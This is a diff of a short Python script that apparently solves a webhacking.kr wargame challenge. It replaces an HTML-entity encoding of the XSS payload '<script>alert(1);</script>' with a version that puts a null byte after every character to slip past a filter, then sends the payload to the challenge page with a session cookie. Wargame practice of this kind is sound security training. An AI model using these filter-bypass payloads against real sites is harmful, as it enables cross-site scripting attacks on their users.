@@ -1,19 +1,19 @@
 
 import requests
 import string
-url = "https://webhacking.kr/challenge/bonus-3/index.php"
-print("webhacking"*30)
-crack_no_encoded = "<script>alert(1);</script>"
-crack_encoded =""
-for c in crack_no_encoded:
-    if c in string.ascii_letters:
-        crack_encoded += "&#" + str(ord(c)) + ";" 
-    else:
-        crack_encoded += c
-print(crack_encoded)
+URL = "https://webhacking.kr/challenge/bonus-3/index.php"
+SESSION_ID = "123"
+cookies = {'PHPSESSID':SESSION_ID}
+params = {'code':''}
 
-# response = requests.get(url+"?code="+crack_encoded )                                
+    
+intial_payload = "<script>alert(1);</script>"
+payload = ''
+for c in intial_payload:
+    payload += c + '\0'
 
-# print(response.text)
+params['code'] = payload
+response = requests.get(URL, params=params, cookies=cookies)
+print(response.text)
 
     
